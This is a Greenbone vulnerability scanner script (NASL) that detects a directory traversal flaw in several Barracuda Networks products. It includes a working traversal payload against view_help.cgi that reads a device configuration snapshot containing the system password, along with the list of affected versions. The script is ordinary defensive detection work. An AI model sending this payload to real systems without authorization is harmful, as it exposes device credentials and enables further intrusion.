# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100847");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-10-06 12:55:58 +0200 (Wed, 06 Oct 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Barracuda Networks Multiple Products Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "gb_get_http_banner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("BarracudaHTTP/banner");

  script_tag(name:"summary", value:"Multiple Barracuda Networks products are prone to a directory
  traversal vulnerability because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"A remote attacker can exploit this vulnerability using directory
  traversal characters ('../') to access files that contain sensitive information that can aid in
  further attacks.");

  script_tag(name:"affected", value:"Barracuda IM Firewall 3.4.01.004 and earlier

  Barracuda Link Balancer 2.1.1.010 and earlier

  Barracuda Load Balancer 3.3.1.005 and earlier

  Barracuda Message Archiver 2.2.1.005 and earlier

  Barracuda Spam & Virus Firewall 4.1.2.006 and earlier

  Barracuda SSL VPN 1.7.2.004 and earlier

  Barracuda Web Application Firewall 7.4.0.022 and earlier

  Barracuda Web Filter 4.3.0.013 and earlier");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43520");
  script_xref(name:"URL", value:"http://www.barracudanetworks.com/ns/support/tech_alert.php");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);
if (!banner || banner !~ "Server\s*:\s*BarracudaHTTP")
  exit(0);

foreach dir (make_list("/cgi-mod", "/cgi-bin")) {
  url = dir + "/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00";

  if (http_vuln_check(port: port, url: url, pattern: "system_password",
                      extra_check: make_list("system_netmask", "system_default_domain"))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
